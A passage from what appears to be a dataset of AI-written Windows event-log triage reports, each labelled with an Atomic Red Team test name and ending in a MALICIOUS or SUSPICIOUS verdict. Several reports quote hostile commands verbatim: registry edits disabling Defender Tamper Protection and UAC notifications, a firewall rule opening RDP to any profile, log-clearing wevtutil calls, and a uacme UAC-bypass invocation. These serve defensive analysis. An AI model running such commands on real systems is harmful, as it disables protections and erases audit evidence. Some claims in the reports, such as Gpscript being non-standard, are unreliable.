   - Processes executed with High integrity level privileges in a consistent manner, involving a user context with admin-like privileges (""SERVER002\\admin_test""). This could indicate misuse of legitimate credentials or potential privilege escalation tactics.
   - Execution of **whoami.exe** and **hostname.exe** which might be used to gather system and user information, potentially indicative of reconnaissance activities.

4. **Service and System Dependency Manipulations**
   - Logs indicate controlled shutdowns of services like **edgeupdate**, further suggesting efforts to control or disrupt system service integrity.

### Assessment and Conclusion

The collected log events distinctly show a pattern of unauthorized log clearance, indicative of log tampering to evade detection. The behaviors surrounding command execution and attempted artifact obfuscation present clear signs of malicious activity. The administrator account (""admin_test"") engaged in behaviors aligned with potential malicious conduct, such as altering file attributes for stealth and clearing logs. The repetitive usage of system utilities to manipulate logging and inherent system processes in a co-ordinated timeline underscores these indicators as a targeted malicious activity.

### Resolution
- **MALICIOUS**: These logs reflect a sophisticated attempt to execute potentially arbitrary code and cover tracks by clearing a variety of event logs, altering file properties to hide artifacts, and utilizing elevated system commands possibly leading to persistent system control.

### Guidance
- **Immediate Actions:**
  - Disable or closely monitor the ""admin_test"" account and reset associated credentials.
  - Conduct full forensic analysis on the system and network to identify potential further compromise.
  - Review access logs for lateral movement and correlate with network traffic to determine breach extent.
  - Restore the event logging mechanisms and ensure logs are stored securely and off-server for integrity checks.

- **Future Measures:**
  - Implement stricter logging and monitoring policies with advanced alert mechanisms for unauthorized high-level integrity process executions and log clearance events.
  - Enhance user account controls, applying the principle of least privilege.
  - Regularly audit and verify system integrity, especially focusing on process behaviors and file integrity in sensitive directories."
Invoke HTML Application - Direct download from URI,"**Analysis of the Windows Event Logs**

### Overview

The given logs consist of entries from Security, Application, Windows PowerShell, Sysmon, and System logs. The timeline and sequence of events indicate a series of suspicious activities that suggest potential malicious intent.

### Indicators of Malicious Activity

1. **Log Clearing Activity:**
   - Multiple events (Security Log EventID 1102, System Log EventID 104) indicate that log files in the Security, System, and Windows PowerShell channels have been cleared. This action is commonly associated with adversaries attempting to cover their tracks post-exploitation.
   - The user `admin_test` on `SERVER002` is identified in the log clearing events, suggesting that these actions were performed using administrative credentials.

2. **Suspicious PowerShell Activity:**
   - There are several PowerShell events that show an execution invoking external code via `Invoke-ATHHTMLApplication` from a GitHub URL tied to the atomic-red-team, which is used for testing threat detection. This specific script appears to leverage `mshta.exe` to execute HTML applications, a known technique used by attackers for executing harmful scripts.
   - The command used is indicative of a T1218.005 attack technique (Mshta), which is part of MITRE’s techniques for lateral movement and execution. 

3. **Sysmon Logs:**
   - Sysmon logs show the execution of several processes (e.g., `wevtutil.exe`) with the command line used for clearing logs, consistent with the log clearing entries noted above.
   - The parent process for this activity is `wsmprovhost.exe`, which is a legitimate process but can be exploited if attacked, suggesting a potential compromise.

### Threat Assessment

The behavior observed in the logs suggests an attempt to hide potentially malicious activity by deleting event logs, coupled with the execution of potentially malicious scripts via PowerShell. The combination of log clearing with script execution patterns that match known adversarial tactics constitutes strong evidence of a security incident.

### Conclusion

Based on the patterns of log clearing and suspicious PowerShell executions, the evidence strongly supports the likelihood of malicious activity. As these actions are characteristic of threat actors attempting to evade detection and maintain persistence within a network, they meet the criteria for confirmed malicious activity.

### Resolution: MALICIOUS

Provlaunch.exe Executes Arbitrary Command via Registry Key,"### Analysis of Windows Event Logs

Upon analyzing the provided log entries from the Windows system, several activities stand out as potentially suspicious. Here is a detailed breakdown:

#### 1. **Clearing of Log Files**
- **Security Log Clear**: Event ID 1102 in the Security log shows the logs were cleared by a user named `admin_test`. The clearing of security logs could be an indicator of a malicious actor attempting to cover their tracks.
- **System Log Clear**: Event ID 104 in the System log also indicates the logs for both System and Windows PowerShell channels were cleared by the same user `admin_test`. This behavior is often linked to an attempt to obfuscate malicious activities.

#### 2. **Command Execution with Administrator Privileges**
- The Sysmon logs reveal multiple executions of `wevtutil.exe` clearing event logs across different channels (operational, application, system, and security). Such behavior, especially when executed consecutively, is uncommon for normal user operations but is a known tactic used in attacks to cover tracks.
   
#### 3. **Suspicious `cmd.exe` Execution**
- A command (`cmd.exe`) found in Sysmon EventID 1 is executed with a complex sequence of registry modifications, followed by launching `calc.exe` through `provlaunch.exe`. The modification of registry keys and the unconventional method to launch `calc.exe` are strong signs of potentially malicious behavior. These are common techniques for persistence, privilege escalation, or evading detection, often used by adversaries.

#### 4. **Use of Built-in Windows Tools and Low-level File Access**
- The command-line arguments used with tools like `wevtutil.exe`, `cmd.exe`, and `reg.exe` suggest attempts to manipulate system functionalities and possibly attempt privilege escalation and persistence mechanisms.

#### 5. **Execution of `whoami.exe` and Network-related Utilities**
- The presence of `whoami.exe` execution is relatively common for users checking their current user account information, but in the context of other suspicious activities, it may imply reconnaissance executed by an attacker to ascertain their access level.

#### 6. **Multiple Instances of Edge Update Activity**
- The logs contain numerous entries related to Microsoft Edge Update activities running under `NT AUTHORITY\SYSTEM`. While regular update processes are normal, the timing in conjunction with other suspicious events suggests checking for anomalies in these update operations for tampering or exploit attempts.

### Assessment and Recommendations

**Resolution: MALICIOUS**

Based on the evidence provided by the event logs, the following activities indicate a malicious compromise:
- Intentional clearing of various log files by the `admin_test` user.
- Execution of built-in Windows utilities (`wevtutil`, `cmd`, `reg`) in a sequence that suggests attempts to manipulate system logs and registry settings likely for malicious intent.
- The command-line activity indicating unusual registry operations coupled with the launch of non-standard processes (e.g., `calc.exe` via provisioning tools).

### Guidance on How to Proceed

1. **Immediate Isolation**: Isolate the affected system from the network to prevent potential lateral movement by an adversary.
2. **Comprehensive Forensics**: Conduct additional forensic analysis focusing on disk images, memory dumps, and network traffic related to the involved accounts and processes.
3. **Reset User Credentials**: Reset the credentials for the `admin_test` user account and assess for unauthorized access across other accounts.
4. **Enhance Monitoring**: Increase monitoring and logging capabilities across other systems to ensure early detection of similar activities.
5. **Patch Management**: Ensure all systems are updated to protect against known vulnerabilities that could be exploited.
6. **User Training**: Review user training programs to ensure employees understand security best practices, especially concerning the use of privileged accounts.

These steps should help mitigate the current issue and assist in preventing similar incidents in the future."
Lolbin Gpscript startup option,"Upon reviewing the provided Windows event logs, several suspicious activities were observed that might indicate malicious behavior:

1. **Event Log Clearing:**
   - **Security Log Entry (EventID 1102):** The security event log indicates that the logs were cleared by the user `admin_test`. Log clearing actions (Event IDs 1102 in Security and 104 in System) are often associated with malicious activities trying to cover their tracks.

2. **Usage of `wevtutil`:**
   - Multiple Sysmon logs show execution of `C:\Windows\System32\wevtutil.exe` with the command line argument `cl`, which stands for clearing logs in a particular channel (e.g., Security, System, Application, Windows PowerShell). This corroborates the above-finding of log clearing.

3. **Command Execution with Suspicious Arguments:**
   - A command `cmd.exe /c Gpscript /startup` is executed. The '`Gpscript`' is not a standard Windows command and could potentially be a custom script. The usage of `cmd.exe` to execute a script is a common method used in executing malicious scripts.

4. **Time Change Events:**
   - The system time was modified twice in quick succession (EventID 4616). Time adjustments might be used as a technique to manipulate timestamps on files and logs, potentially for anti-forensic purposes.

5. **Repeated Execution of `whoami` and `hostname`:**
   - Processes like `whoami.exe` and `hostname.exe` are executed, possibly to gather information about the current user and system. While not inherently malicious, such activities, in conjunction with log-clearing activities, could be indicative of reconnaissance behavior by an attacker.

6. **Microsoft Edge Update Processes:**
   - Although the numerous executions and logs of Microsoft Edge Update processes could be part of routine operations or automatic updates, combined with the other suspicious actions, they warrant further examination. 

Based on these observations, the collective behavior strongly suggests adversarial or at least unauthorized actions taking place on the system. The logs demonstrate attempts not only to gather information but also to conceal such activities, which is a hallmark of malicious activity. Therefore, I would classify this activity as:

- **MALICIOUS**

**Recommended Guidance:**
- Conduct a complete forensic analysis of `admin_test` user activities.
- Examine network logs for potential data exfiltration or unusual outbound connections.
- Identify and isolate the system from the network to prevent further damage.
- Conduct a thorough malware analysis to identify any residual or persistent threats.
- Implement stricter audit policies to detect and respond to similar activities more promptly in the future."
Disable UAC notification via registry keys,"Upon reviewing the provided Windows event logs, several activities stand out as highly suspicious and indicative of potentially malicious behavior. Here is a detailed analysis:

1. **Clearing of Event Logs**: 
   - The logs indicate that the user `admin_test` cleared three critical logs (`System`, `Windows PowerShell`, and `Security`), which is captured in events with IDs 104 and 1102 respectively. The clearing of logs, especially security logs, is an unusual and suspicious action typically executed to cover tracks after malicious activity.

2. **Process Execution and Command-Line Arguments**:
   - There are multiple instances of the process `wevtutil.exe` being executed with the `cl` (clear log) command across various logs (Application, System, Security). This is suspicious as it indicates an intentional effort to purge logs.
   - Additionally, a highly suspicious command was executed via `cmd.exe`: `reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f`. This command attempts to modify the registry to disable User Access Control (UAC) notifications, which can allow further actions without user consent or awareness, a tactic often used by attackers to escalate privileges.

3. **Privilege Escalation and Integrity Level**:
   - Observations in the Sysmon logs reveal high integrity levels for processes spawning other suspicious activities, indicating administrative privileges, which often signal potential privilege escalation.

4. **Presence of `svchost.exe` and Other Executions**:
   - While `svchost.exe` is a legitimate and critical Windows process, its presence in these logs correlating with time adjustments could indicate a time manipulation attempt to evade timestamp-based detection mechanisms.

5. **Activity Timeline**:
   - The timeline of these log entries suggests a coordinated sequence aiming to modify system configuration settings and clear logs, which aligns with common tactics in a ransomware or APT (Advanced Persistent Threat) attack scenario.

**Assessment**: Given the combination of event log clearing, registry modification for security settings, and usage of tools typically utilized for administration in a high-integrity context, these activities are indicative of a compromise. 

**Final Resolution**: **MALICIOUS** - The logs contain activity that can be determined as malicious with a high degree of confidence. 

**Guidance**:
- Immediate containment measures should be enacted to disconnect the affected host from the network to prevent further spread or data exfiltration.
- A thorough investigation should be conducted to identify indicators of compromise (IOCs), related to this activity across the network.
- Restore systems from a known good state prior to the events described.
- Implement additional logging and monitoring solutions, and review security settings to prevent recurrence. Consider a full incident response to determine the scope and impact."
Indirect Command Execution - conhost.exe,"Upon analyzing the provided Windows event logs from the host ""Server002,"" several activities raise concerns regarding potential malicious behavior. Here is the detailed analysis:

1. **Log Clearance Activity**:
   - The logs indicate multiple events of log file clearance (Event ID 1102), initiated by the user ""admin_test"" on the same date, 2024-10-25, at around 17:34. The use of the `wevtutil.exe` command-line utility is observed in Sysmon logs, targeting the Security, System, and Windows PowerShell event logs for clearance. 
   - Frequent log clearance, especially involving security and system logs, is typically indicative of an attempt to cover tracks associated with nefarious activities.

2. **Process Execution and Command Line Arguments**:
   - There is an execution of `whoami.exe` and `HOSTNAME.EXE` by the user ""admin_test"". Although these binaries are legitimate and standard, their usage right before log clearance could relate to reconnaissance activities.
   - The use of `cmd.exe` in conjunction with `notepad.exe` seems atypical, especially when executed from what appears to be a temporary directory (C:\Users\ADMIN_~1\AppData\Local\Temp). This could suggest payload execution or some form of execution masking.
   
3. **Time Change Events**:
   - Events indicating system time changes (Event ID 4616) are present, managed by `svchost.exe`. Though time adjustments could be routine, in conjunction with the log clearance and other unusual activities, it could be an attempt to manipulate timestamps.

4. **Updates and System Level Executions**:
   - A significant number of executions relate to Microsoft Edge Update processes in the Sysmon logs. While system or application updates are routine tasks, its repetitive and large-scale presence paired with log clearances raises questions about legitimate system use versus staged malware exploration under the guise of updates.

5. **Privilege and Integrity Levels**:
   - High integrity levels for `wevtutil.exe` indicate elevated privileges, often required for compromising or manipulating event logs.

### Assessment:
Given the combination of log clearance, atypical command executions, and process activities, these actions collectively signal a higher-than-usual probability of attempted stealth activity indicating a compromise of the system. The sequence, frequency, and timing of the log clearance coupled with process executions align with known techniques used to obfuscate investigations.

### Resolution:
- **MALICIOUS** - The logs showcase definitive activities consistent with malicious behavior, namely evidence tampering through log clearance and potential reconnaissance using system binaries. This requires immediate attention.

### Guidance:
- **Immediate Steps**:
  - Isolate ""Server002"" from the network to prevent further compromise.
  - Preserve all existing logs and files for a thorough forensic analysis.
  - Conduct a detailed investigation into user ""admin_test,"" including activity logs pre and post event times.
  - Review system integrity and re-initiate log configurations post-restoration.

- **Further Investigation**:
  - Engage network and endpoint monitoring to establish if there’s lateral movement or similar patterns on other network assets.
  - Examine memory dumps for additional indicators of compromise (IOC).
  - Verify the integrity of applications and executables, focusing on those frequently involved in the logs.

By following these steps, the organization can ensure the containment and remediation of the potential security incident."
Activate Windows NoRun Group Policy Feature,"### Detailed Analysis of Windows Event Logs

#### Overview:
The provided Sysmon, System, Application, and Security logs from `Server002` on `2024-10-24` show several activities:

1. Execution of utilities such as `whoami.exe`, `wevtutil.exe`, `hostname.exe`, and `cmd.exe`.
2. Multiple clearances of event logs (`System`, `Windows PowerShell`, `Security`).
3. Time skew adjustments on the machine.
4. Windows updates installations and process starts related to Microsoft Edge.

#### Key Observations:

1. **Process Execution (Sysmon Log):**
    - The execution of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` by user `admin_test` are present, which are typical for system checks and management.
    - `wevtutil.exe` is used to clear logs (System, Security, Windows PowerShell) which is a red flag indicating possible concealment of activities.
    - The `cmd.exe` process line indicates modification of registry settings, particularly disabling “NoRun” which prevents users from running programs, which is suspicious.

2. **Log Clearance (System & Security Log):**
    - Event 104 in the System log and Event 1102 in the Security log show clearance actions by user `admin_test`, which are significant as they suggest intentional log clearing.
    - Clearing logs paired with registry edits strongly indicate a potential malicious activity intending to evaporate traces.

3. **Time Adjustments (System & Security Logs):**
    - Multiple time skew adjustments between 15:16:49 and 15:17:03 captured through `svchost.exe` might align with activities that necessitate time synchronization, although usually benign, needs checking against log manipulation.

4. **Other Activities (Application & System Logs):**
    - `Microsoft Edge` update activities seem routine as they align with system-level operations with trusted `NT AUTHORITY\SYSTEM` context and standard paths.

#### Threat/Risk Assessment:

- **Suspicious Use of Valid Tools:**
  Given the pattern of processes used (`whoami`, `wevtutil` for log management), especially the sequence clearing logs combined with registry modifications, these are clear indicators of potential unauthorized access or system misuse.

- **Registry Manipulation:**
  Use of `cmd.exe` to change registry policies under `HKEY_CURRENT_USER` for restrictions (likely removing run commands visibility) demonstrates an alignment with behavior to obscure or restrict user interactions post-compromise.

#### Recommended Actions:

1. Immediately conduct system integrity checks and confirm the current state of critical registry entries.
2. Initiate a detailed forensic investigation of user `admin_test`'s activities including audit logs and remote access records.

**MALICIOUS** - The combination of events strongly indicates a well-concealed attempt to modify system behavior and cover tracks, likely pointing to unauthorized access or insider threat activities."
Creating W32Time similar named service using sc,"The provided Windows event logs show several indicators that warrant closer examination due to potentially suspicious activities:

1. **Clearing of Event Logs:**
    - Multiple entries in the System and Security logs indicate that the event logs have been cleared (`EventID: 104` for System and Windows PowerShell, and `EventID: 1102` for Security) by the user `admin_test`. This can be an attempt to cover up malicious activity or system changes and is often considered suspicious.

2. **Unusual Service Creation:**
    - An event with `EventID: 7045` indicates the creation of a service named `win32times`. The service's command line specifies starting a non-existent script `c:\T1036.004_NonExistingScript.ps1` through `cmd.exe`. This is suspicious as it involves a likely impersonation attempt (T1036.004 corresponds to MITRE ATT&CK's masquerading technique).
    - The use of the command `sc create` to register a new service appears abnormal for regular operations, especially when combined with a non-existent file.

3. **Process Execution:**
    - The `wevtutil.exe` command used multiple times to clear logs (System, Application, and Security) indicates attempts to hide activity.
    - Use of `cmd.exe` with commands related to `sc.exe` for service creation indicates potentially hostile configuration changes.

4. **Common Utility Executions:**
    - The frequent execution of utilities such as `whoami.exe`, `hostname.exe`, and manipulation of logs (`wevtutil.exe`) by `admin_test` may signify enumeration activities often seen during an attacker's reconnaissance phase.
  
5. **Overall Assessment:**
    - The clearing of logs, attempts to create potentially malicious services, coupled with enumeration-type activities strongly suggest a security incident.

Open a local port through Windows Firewall to any profile,"**Detailed Analysis of Windows Event Logs**

## Analysis Overview

The logs provided show a series of events captured by Sysmon, PowerShell, System, Application, and Security logs on Server002. The main observations include process execution related to system utilities and several instances related to Microsoft Edge's update processes. There is a noticeable interaction with system configurations, potentially involving malicious behavior.

## Suspicious Behavior

1. **Suspicious PowerShell Command Execution**
   - The PowerShell logs reveal the execution of a command that modifies firewall rules: `netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any`. This rule allows incoming traffic on RDP port 3389, which could be a potential security risk if done without legitimate administrative reasons.

2. **Event Log Clearing**
   - There are logs indicating that system logs (System and Security channels) were cleared by the user `admin_test`. Log clearing is a behavior often associated with malicious activity, as it covers tracks of other potentially harmful activities.

3. **Process Execution Sequence**
   - The sequence of executed processes includes `wevtutil.exe`, which is used to manage event logs, and is observed being executed multiple times. Event log clearing followed by alterations to firewall settings are indicative of potential malicious intent.

4. **Privilege Level**
   - Several processes are executed with a high integrity level, likely indicating administrative privileges. Processes of interest executed under `SERVER002\admin_test` account include:
     - `whoami.exe`: Could be used for reconnaissance to check for current user privileges.
     - `Command-line utilities` like `wevtutil.exe`, which may have been used for log management.
  
5. **Time Discrepancy**
   - A minor time discrepancy is observed through the `Microsoft-Windows-Kernel-General` event for modifications to time settings. While this could be benign, it is something to be aware of in the context of other suspicious activities.

6. **Elevation & Execution Contexts**
   - `wsmprovhost.exe` (part of Windows Remote Management) is the parent process for several key operations. This context suggests potential remote completions or automated scripts performing these sequences.

## Potential Risks or Threats

- **Open RDP Port:** Opening RDP port 3389 allows potential remote access, which could be exploited if left unguarded.
- **Log Manipulation:** The clearing of event logs may have been an attempt to disrupt audit trails, complicating forensic analysis.
- **Remote Control or Execution:** The usage patterns of utilities and PowerShell may suggest either automated scripts operating with elevated privileges or manual control with objectives not aligning with routine administration.

## Guidance and Recommendations

1. **Immediate Review of Access Controls:**
   - Confirm whether `admin_test` user account actions were legitimate and authorized.

2. **Security Assessment:**
   - Assess whether additional security controls are required for processes that open RDP ports, introducing further visibility and protective measures (e.g., restricting RDP access to trusted IP ranges).

3. **Log and System Monitoring Enhancements:**
   - Enable enhanced logging and possibly alerts for specific activities like changes in firewall rules or log clear events.
   - Review retention policies to prevent log tampering or deletion by unauthorized users.

"
Abusing Windows TelemetryController Registry Key for Persistence,"### Detailed Log Analysis

**Suspicious Behavior:**

1. **Event Logs Clearing:**

   There are multiple events indicating that logs for various channels were cleared by the user ""admin_test."" Specifically:

   - `System log (Event ID 104)`: Entry shows the system log was cleared.
   - `System log (Event ID 104)`: Entry shows the PowerShell log was cleared.
   - `Security log (Event ID 1102)`: Entry shows the security log was cleared.

   The action of clearing logs, especially multiple logs in quick succession, is suspicious and often indicative of malicious activity, as it can be an attempt to hide evidence of inappropriate or unauthorized actions.

2. **Unchecked Command Execution:**

   - **Sysmon Log (Cmd Execution):** There is an entry where `cmd.exe` was used to modify the registry: 
     ```
     CommandLine: ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\NewKey"" /t REG_SZ /v Command /d C:\Windows\System32\notepad.exe /f
     ```
     This action might indicate an attempt to modify system behavior or settings, which is a common tactic for persistent foothold or privilege escalation.
   
3. **Frequent Use of Eventing Command Line Utility (`wevtutil.exe`):**

   There are multiple entries where `wevtutil.exe` is invoked to clear logs:
   ```
   CommandLine: ""C:\Windows\system32\wevtutil.exe"" cl System
   CommandLine: ""C:\Windows\system32\wevtutil.exe"" cl Application
   ```
   This supports the actions noted in the logs clearing events, further suggesting an effort to cover tracks.

**Potential Malicious Indicators:**

- **Log Clearing by User `admin_test`:** The use of `admin_test` to clear logs at a high integrity level is consistent with activity an attacker might undertake to conceal their presence or actions on a host.
  
- **Registry Modification via CMD:** The modification made through `cmd.exe` without clear business justification or necessity, especially in conjunction with log clearing, is indicative of suspicious, potentially hostile activity.

### Assessment

Based on the analysis above, the series of actions suggest a coordinated attempt to cover tracks, modify critical system areas unexpectedly, and potentially escalate privileges. No benign explanation could rationalize such behavior effectively, particularly given the quick succession and combination of events.

**Resolution: MALICIOUS**

### Recommendations

- **Immediate Investigation:**
  - Conduct a thorough endpoint analysis of this host to identify any further indications of compromise.
  - Check for any unauthorized accounts or privilege escalations.
  - Trace the origin of these commands and processes to identify potential breach points.

- **Security Enhancements:**
  - Strengthen monitoring around privileged accounts and critical system utilities like `wevtutil.exe`.
  - Implement stricter audit policies to capture unexpected or unauthorized access behavior, especially for administrative operations.

- **Remediation Actions:**
  - If malicious activities are confirmed, isolate the affected host from the network.
  - Consider a full credential reset procedure for any accounts potentially compromised.
  
- **Log Retention and Analysis:**
  - Ensure a more robust log retention policy is in place to prevent unauthorized clearing without detection or alerting.
  - Use security information and event management (SIEM) tools to flag suspicious log-clearing activities immediately.

This situation demands urgent attention to prevent further unauthorized access or damage."
UACME Bypass Method 56,"Based on the provided event logs, let's analyze the activities recorded and identify any suspicious or malicious behavior.

1. **Usage of `uacme` and Akagi64.exe**:
   - In the Sysmon logs, we see the process `""C:\\Windows\\System32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe`. 
   - The usage of `uacme` suggests a bypass of User Account Control (UAC) which can be used for privilege escalation. The `Akagi64.exe` is identified as a part of the `uacme` tool which is known for testing and executing UAC bypass techniques.

2. **Clearing of Event Logs**:
   - Events with IDs 104 in the System log and 1102 in the Security log indicate that event logs have been cleared by the user `admin_test`.
   - Clearing logs is a common tactic employed by attackers to hide their tracks.

3. **Multiple wevtutil.exe Processes**:
   - Multiple occurrences of `wevtutil.exe` with the command line to clear various logs (e.g. `wevtutil cl System`) are logged. This tool is typically used to manage event logs, including clearing them, which can be suspicious when combined with the context of other activities.

4. **Atomic Red Team Artifacts**:
   - The presence of `AtomicRedTeam` in the file path suggests the possible use of a well-known library of tests designed to simulate various adversarial techniques. While Atomic Red Team is a legitimate tool used for testing defenses, its presence should be correlated with whether it was used intentionally and by authorized personnel.

5. **Edge Update and Other System Tasks**:
   - The logs also show several instances of `MicrosoftEdgeUpdate.exe`, which itself might be benign, reflecting normal update behavior. However, the presence of system update artifacts among suspicious activities can sometimes indicate a blended approach to obfuscate malicious actions.

**Assessment:**
- The combination of UAC bypass tools, clearing of event logs, and suspicious command execution suggests potentially malicious activity. These actions are characteristic of an attempted or ongoing compromise, where the attacker may be using legitimate tools to bypass security controls and hide evidence.

**Resolution**: MALICIOUS

**Guidance**:
- Immediately isolate the affected host to prevent further potential damage.
- Conduct a thorough forensic investigation to understand the full scope of the attack and ascertain if other systems are affected.
- Review access logs and alert on similar activities across the network.
- Implement stricter controls and monitoring around the use of privileged accounts and log management.
- Educate and train users on the importance of reporting suspicious activities or unexpected behaviors."
Tamper Win Defender Protection,"Upon analyzing the provided Windows event logs, the following observations and assessments can be made:

### Key Observations and Analysis:

1. **Log Clearing Events:**
   - Multiple events indicate the clearing of security, system, and PowerShell logs by the user `admin_test`. This action is often considered suspicious because it can be an attempt to cover up malicious activity.
   - Events of note:
     - Security Log Cleared: Event ID 1102
     - System Log Cleared (Security Log): Event ID 104

2. **Time Manipulation:**
   - Event ID 4616 shows changes in system time, which can be associated with anti-forensic behavior. The system time was set back, which may complicate the correlation of timestamps in log files.

3. **Registry Modification:**
   - A command was executed to modify the Windows registry to disable Tamper Protection for Windows Defender:
     - Command executed: `""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f`
   - Disabling security features like Tamper Protection is a strong indicator of malicious intent.

4. **Service Execution:**
   - Normal service executions for Microsoft Edge Update are recorded, running under the `NT AUTHORITY\SYSTEM` account. These likely represent routine update operations, which generally aren't suspicious unless coupled with other malicious indicators.

5. **Process Creations:**
   - Various system processes, such as `wevtutil.exe` (used to clear logs) and `cmd.exe` (used for registry changes), are executed by `admin_test`, indicating command-line activity that is clearly administrative but aligns with efforts to hide evidence.

### Assessment and Final Resolution:

Given the combination of log-clearing activities, time manipulation, and registry tampering aimed at weakening system defenses, these actions align with tactics often used in malicious activities:

- **Log Clearing:** Suggests potential evidence tampering or obfuscation attempts.
- **Registry Modification:** Directly impacts system security by disabling Windows Defender Tamper Protection.
- **Time Changes:** Can be used to confuse timeline tracking, another technique often employed by attackers.

### Guidance and Next Steps:

1. **Treat this Incident as MALICIOUS.** The combination of actions strongly suggests malicious intent.
2. **Immediate Actions:**
   - Isolate the affected host from the network to prevent further actions by the attacker.
   - Begin a comprehensive forensic investigation to recover necessary logs and determine the full scope and potential data exfiltration or lateral movement.
3. **Assess Entry Points:** Investigate how the attacker gained access or privilege escalation for the user `admin_test`.
4. **Review and Strengthen Security:**
   - Reinforce logging policies and alert on log-clearing activities.
   - Review and audit user permissions, especially those with administrative capabilities.

As these events demonstrate clear indicators of malicious activity, an immediate response and a thorough investigation are warranted to mitigate any ongoing risks and address the compromise efficiently."
Control Panel Items,"To analyze the provided Windows event logs for potential malicious activity, we will review various logs and indicators such as the execution of suspicious processes, use of specific command-line arguments, privilege escalation attempts, and any attempts to clear logs which might indicate an adversary's attempt to cover their tracks.

### Analysis of Windows Event Logs:

1. **Event Log Clearing (System and Security Logs):**
   - **System Log (EventID 104)**: Multiple instances where logs are cleared (e.g., channels: 'System', 'Windows PowerShell') by the user `admin_test` are concerning. Log clearing can often be an indication of malicious activity, as an adversary tries to remove traces of their actions.
   - **Security Log (EventID 1102)**: This event indicates the security log was cleared, which is particularly suspicious, suggesting malicious intent to erase evidence of other actions.

2. **Suspicious Process Executions:**
   - **Sysmon Logs regarding `wevtutil.exe` Executions**: The use of `wevtutil.exe` (Eventing Command Line Utility) by `admin_test` to clear various event logs (Sysmon, System, Application, and Security) is not typical in regular administrative operations unless under very specific maintenance circumstances, which should be documented.
   - **Command Execution Leading to Calculator Launch**: The Sysmon events show a chain of execution initiated from `cmd.exe` executing `control.exe`, which subsequently launches `rundll32.exe` and eventually `calc.exe`. This pattern indicates a known LOLBAS (Living Off the Land Binaries and Scripts) technique where native Windows binaries are misused by attackers to execute arbitrary payloads indirectly.
   
3. **Use of Elevated Privileges:**
   - Many of the suspicious activities described above, especially related to `wevtutil.exe`, occur at a high integrity level and are executed by the user `admin_test`. Although the user has legitimate access, the actions being performed are consistent with attempts to hide potentially malicious activities.

### Conclusion:

Based on the analysis of the provided logs, the behaviors observed, such as the clearing of security and system logs and the use of native binaries in non-standard ways, indicate potentially malicious activities. These actions align with TTPs (Tactics, Techniques, and Procedures) used by adversaries to evade detection and persist in a compromised system.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Mitigation:**
   - Isolate the affected host (`Server002`) from the network to prevent further compromise.
   - Conduct a forensic analysis of the host to identify potential malware or backdoors and preserve evidence.

2. **Review and Monitoring:**
   - Audit user accounts, especially the actions of `admin_test`, and reset passwords for any affected accounts.
   - Increase monitoring on similar events across other systems to detect potential lateral movement.

3. **Patch Known Vulnerabilities:**
   - Ensure all systems are up-to-date with security patches and review system configurations to harden against similar exploits.

4. **Incident Response and Reporting:**
   - Document all findings, actions taken, and evidence collected.
   - Report the incident to the respective security authorities within the organization and consider notifying external partners if necessary.

By taking these steps, the organization can address the immediate threat and strengthen its defenses against future incidents."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"Upon reviewing the provided logs, several indicators suggest suspicious activity that requires further investigation:

### Analysis

1. **PowerShell Activity**:
   - The execution of `powershell.exe` is found with obscure command-line arguments involving `Invoke-CimMethod` to install a package (`T1218.007_EXE.msi`) from a temporary folder related to Atomic Red Team tools. This is often indicative of simulation or testing for security tools or attack simulations designed to mimic real cyber attack tactics.

2. **Wevtutil Usage**:
   - The consistent use of `wevtutil.exe` to clear various logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` logs is concerning. This tool is generally leveraged to manage and clear event logs. Clearing logs can be an indicator of malicious activity, as attackers might want to cover their tracks after executing potentially harmful actions.

3. **Sysmon High Integrity Level**:
   - Multiple processes were executed at a high integrity level by the user `SERVER002\\admin_test`. High integrity level executions suggest that the actions performed could affect system-wide settings or files, which points toward privilege misuse or escalation attempts.

4. **Security Log Clearing**:
   - The Security event log (Event ID 1102) indicates that the logs were cleared by the user `admin_test`. Clearing an event log under the security context indicates potential attempt to remove traces of unauthorized activities, which is a red flag.

5. **Atomic Red Team**:
   - Mention of Atomic Red Team packages and conspicuous events like the “Atomic Red Team Test Installer” suggest activities potentially aligned with security testing or red team exercises. However, without confirmation of legitimate testing activities, such activities should be approached with caution since they can also mimic genuine attack methodologies.

### Assessment

Based on the analyzed log entries:

- There is a notable indication of **suspicious behavior** due to the invocation of PowerShell scripts with potentially dangerous commands, the clearing of multiple logs that might indicate an attempt to obfuscate actions, and high-level process executions under the `admin_test` account.

### Conclusion

- **Resolution: SUSPICIOUS**

The activities recorded in the logs closely mimic behaviors often associated with malicious intent, such as obfuscation of action tracks and use of high-integrity execution contexts. However, there is also evidence suggestive of controlled testing (e.g., Atomic Red Team). As such, the next steps should include verifying if such activities were part of authorized red team exercises or conducted without proper authorization.

### Guidance on How to Proceed:
1. **Verify with Internal Teams**:
   - Confirm with the cybersecurity team or IT department if they conducted any sanctioned tests involving Atomic Red Team exercises that could account for the unusual activities logged.

2. **Increase Monitoring**:
   - Implement more stringent monitoring protocols for activities involving PowerShell and log-clearing commands, and review access permissions, particularly those associated with the `admin_test` account.

3. **Investigate User `admin_test`**:
   - Conduct a thorough investigation of account `admin_test` to determine if access has been compromised or if the account has been misused.

4. **Check External Communications**:
   - Network logs should be reviewed to identify any unusual outbound communications potentially originating from the compromised environment. 

Proceed with caution and a thorough investigation to ascertain the nature of these activities."
Disable Windows Toast Notifications,"Based on the analysis of the provided Windows event logs, there are several points of interest that draw attention to potential malicious activities:

1. **Event Log Clearing**:
   - The `admin_test` user cleared logs across multiple channels: System, Windows PowerShell, and Security. This is indicated by Event ID 104 in the System and Windows PowerShell logs and Event ID 1102 in the Security logs. Clearing event logs, especially security logs, is a well-known technique used by attackers to cover their tracks post-compromise.
   
2. **Process Execution**:
